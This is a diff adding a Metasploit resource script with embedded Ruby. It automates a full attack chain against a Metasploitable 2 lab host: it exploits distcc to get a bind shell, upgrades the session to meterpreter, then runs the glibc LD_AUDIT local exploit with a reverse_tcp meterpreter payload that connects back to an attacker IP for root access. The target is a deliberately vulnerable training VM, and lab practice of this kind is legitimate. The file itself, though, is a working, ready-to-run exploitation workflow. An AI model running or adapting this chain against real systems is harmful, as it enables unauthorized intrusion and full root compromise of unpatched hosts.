@@ -1,0 +1,281 @@
+#!/usr/bin/env ruby
+# ═══════════════════════════════════════════════════════════════════════════
+# Metasploitable 2 - Distcc Exploitation Workflow
+# ═══════════════════════════════════════════════════════════════════════════
+# Usage: msfconsole -q -r pwn.rc
+#
+# Workflow:
+#   1. Exploit distcc → Get basic shell
+#   2. Upgrade to meterpreter
+#   3. Privilege escalation → Root meterpreter
+#
+# Requirements:
+#   - Set RHOST variable below (target IP)
+#   - Set LHOST variable below (attacker IP)
+#   - Metasploit Framework installed
+# ═══════════════════════════════════════════════════════════════════════════
+
+<ruby>
+# ═══════════════════════════════════════════════════════════════════════════
+# CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════════════
+RHOST = "192.168.0.173"  # Target IP (Metasploitable 2)
+LHOST = "192.168.0.187"  # Attacker IP (your machine)
+
+# ═══════════════════════════════════════════════════════════════════════════
+# HELPER FUNCTIONS
+# ═══════════════════════════════════════════════════════════════════════════
+
+def log_info(msg)
+  print_status("#{Time.now.strftime('%H:%M:%S')} [*] #{msg}")
+end
+
+def log_success(msg)
+  print_good("#{Time.now.strftime('%H:%M:%S')} [+] #{msg}")
+end
+
+def log_error(msg)
+  print_error("#{Time.now.strftime('%H:%M:%S')} [-] #{msg}")
+end
+
+def get_latest_session
+  return nil if framework.sessions.length == 0
+  framework.sessions.values.max_by { |s| s.sid }
+end
+
+def get_session_by_type(session_type)
+  framework.sessions.values.find { |s| s.type == session_type }
+end
+
+def wait_for_new_session(initial_count, timeout = 30)
+  start_time = Time.now
+  while (Time.now - start_time) < timeout
+    if framework.sessions.length > initial_count
+      return get_latest_session
+    end
+    sleep(1)
+  end
+  return nil
+end
+
+def get_random_available_port
+  require 'socket'
+  max_attempts = 50
+
+  max_attempts.times do
+    # Random port between 5000-9999
+    port = rand(5000..9999)
+
+    begin
+      # Try to bind to the port to check availability
+      server = TCPServer.new('0.0.0.0', port)
+      server.close
+      return port
+    rescue Errno::EADDRINUSE
+      # Port in use, try next
+      next
+    rescue => e
+      # Other error, try next
+      next
+    end
+  end
+
+  # Fallback to random high port
+  return rand(5000..9999)
+end
+
+# ═══════════════════════════════════════════════════════════════════════════
+# INITIALIZATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+# Get random available port
+LPORT_BASE = get_random_available_port
+
+log_info("═" * 70)
+log_info("Metasploitable 2 - Distcc Exploitation Workflow")
+log_info("═" * 70)
+log_info("Target: #{RHOST}")
+log_info("Attacker: #{LHOST}")
+log_info("Listener Port: #{LPORT_BASE}")
+log_info("═" * 70)
+
+# Clean up existing sessions
+#log_info("Cleaning up existing sessions...")
+#run_single("sessions -K")
+#sleep(2)
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PHASE 1: DISTCC EXPLOITATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+log_info("═" * 70)
+log_info("PHASE 1: Exploiting distcc (Port 3632)")
+log_info("═" * 70)
+
+initial_session_count = framework.sessions.length
+
+run_single("use exploit/unix/misc/distcc_exec")
+run_single("set RHOSTS #{RHOST}")
+run_single("set LPORT #{LPORT_BASE}")
+run_single("set payload cmd/unix/bind_ruby")
+log_info("Launching exploit...")
+run_single("exploit -z")
+
+sleep(10)
+
+# Get the shell session
+shell_session = wait_for_new_session(initial_session_count, 15)
+
+if shell_session
+  shell_sid = shell_session.sid
+  log_success("Shell session #{shell_sid} opened!")
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # PHASE 2: UPGRADE TO METERPRETER
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  log_info("═" * 70)
+  log_info("PHASE 2: Upgrading to Meterpreter")
+  log_info("═" * 70)
+
+  log_info("Upgrading session #{shell_sid}...")
+  current_session_count = framework.sessions.length
+
+  run_single("sessions -u #{shell_sid}")
+  sleep(15)
+
+  # Find the first working meterpreter session
+  meterpreter_session = nil
+  meterpreter_sessions = []
+
+  framework.sessions.each do |sid, session|
+    if session.type == "meterpreter" && sid != shell_sid
+      meterpreter_sessions << sid
+      if meterpreter_session.nil?
+        meterpreter_session = session
+      end
+    end
+  end
+
+  if meterpreter_session
+    meterpreter_sid = meterpreter_session.sid
+    log_success("Meterpreter session #{meterpreter_sid} created!")
+
+    # Clean up duplicate meterpreter sessions
+    if meterpreter_sessions.length > 1
+      log_info("Cleaning up #{meterpreter_sessions.length - 1} duplicate session(s)...")
+      meterpreter_sessions.each do |sid|
+        if sid != meterpreter_sid
+          run_single("sessions -k #{sid}")
+        end
+      end
+      sleep(2)
+    end
+
+    # Kill the original shell session
+    log_info("Removing original shell session #{shell_sid}...")
+    run_single("sessions -k #{shell_sid}")
+
+  else
+    log_error("Failed to upgrade to meterpreter")
+    log_error("Continuing with shell session #{shell_sid}...")
+  end
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # PHASE 3: PRIVILEGE ESCALATION
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  if meterpreter_session
+    log_info("═" * 70)
+    log_info("PHASE 3: Privilege Escalation")
+    log_info("═" * 70)
+
+    log_info("Attempting glibc LD_AUDIT DSO privilege escalation...")
+    log_info("Target session: #{meterpreter_sid}")
+
+    pre_privesc_count = framework.sessions.length
+
+    run_single("use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc")
+    run_single("set SESSION #{meterpreter_sid}")
+    run_single("set payload linux/x86/meterpreter/reverse_tcp")
+    run_single("set LHOST #{LHOST}")
+    run_single("set LPORT #{LPORT_BASE}")
+    log_info("Launching privilege escalation exploit...")
+    run_single("exploit -z")
+
+    sleep(10)
+
+    # Find all new elevated sessions
+    elevated_sessions = []
+    framework.sessions.each do |sid, session|
+      if session.type == "meterpreter" && sid > meterpreter_sid
+        elevated_sessions << sid
+      end
+    end
+
+    if elevated_sessions.length > 0
+      elevated_sid = elevated_sessions.first
+      elevated_session = framework.sessions[elevated_sid]
+      log_success("Elevated session #{elevated_sid} obtained!")
+
+      # Clean up duplicate elevated sessions
+      if elevated_sessions.length > 1
+        log_info("Cleaning up #{elevated_sessions.length - 1} duplicate elevated session(s)...")
+        elevated_sessions.each do |sid|
+          if sid != elevated_sid
+            run_single("sessions -k #{sid}")
+          end
+        end
+        sleep(2)
+      end
+
+      # Kill the non-root meterpreter session
+      log_info("Removing non-root meterpreter session #{meterpreter_sid}...")
+      run_single("sessions -k #{meterpreter_sid}")
+
+      # Verify root access
+      log_info("Verifying root access...")
+      run_single("sessions -i #{elevated_sid} -c 'getuid'")
+    else
+      log_error("Privilege escalation failed")
+      log_info("Continuing with session #{meterpreter_sid}...")
+      elevated_session = meterpreter_session
+      elevated_sid = meterpreter_sid
+    end
+  else
+    log_info("Skipping privilege escalation (no meterpreter session)")
+    elevated_session = shell_session
+    elevated_sid = shell_sid
+  end
+
+else
+  log_error("Exploitation failed - no session opened")
+  log_error("Workflow terminated")
+end
+
+# ═══════════════════════════════════════════════════════════════════════════
+# FINAL SUMMARY
+# ═══════════════════════════════════════════════════════════════════════════
+
+log_info("═" * 70)
+log_info("EXPLOITATION SUMMARY")
+log_info("═" * 70)
+log_info("Target: #{RHOST}")
+log_info("Total sessions: #{framework.sessions.length}")
+log_info("")
+log_info("Active sessions:")
+run_single("sessions -l")
+log_info("═" * 70)
+
+if framework.sessions.length > 0
+  log_success("Workflow completed successfully!")
+  log_info("")
+  log_info("To interact with a session: sessions -i <id>")
+  log_info("To drop to shell: shell")
+else
+  log_error("Workflow failed - no active sessions")
+end
+
+log_info("═" * 70)
+
+</ruby>
